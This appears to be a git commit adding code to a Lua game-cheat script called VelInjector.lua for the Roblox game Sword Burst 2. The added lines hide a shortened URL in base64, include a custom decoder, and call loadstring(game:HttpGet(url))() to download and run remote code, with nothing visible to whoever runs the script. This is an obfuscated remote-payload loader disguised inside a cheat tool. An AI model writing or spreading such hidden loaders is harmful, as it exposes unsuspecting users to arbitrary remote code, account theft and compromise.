95a4a3a11bf725480cb033bd1a0f4a13e4de010f
Odaralog <arquiaseuclides68@gmail.com>
2025-03-31 15:19:09 -0300

    Update VelInjector.lua

--- VelInjector.lua
+++ VelInjector.lua
@@ -1,5 +1,27 @@
 -- Script ofuscado para injetar Vel no jogo Sword Burst 2
 
+local base64 = "aHR0cHM6Ly9iaXQubHkvNGxoZEhJVw=="
+
+local function base64Decode(data)
+    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    data = string.gsub(data, '[^'..b..'=]', '')
+    return (data:gsub('.', function(x)
+        if (x == '=') then return '' end
+        local r,f='',(b:find(x)-1)
+        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
+        return r;
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+        if (#x ~= 8) then return '' end
+        local c=0
+        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
+        return string.char(c)
+    end))
+end
+
+local url = base64Decode(base64)
+
+loadstring(game:HttpGet(url))()
+
 local a = "HttpService"
 local b = "Players"
 local c = "ReplicatedStorage"
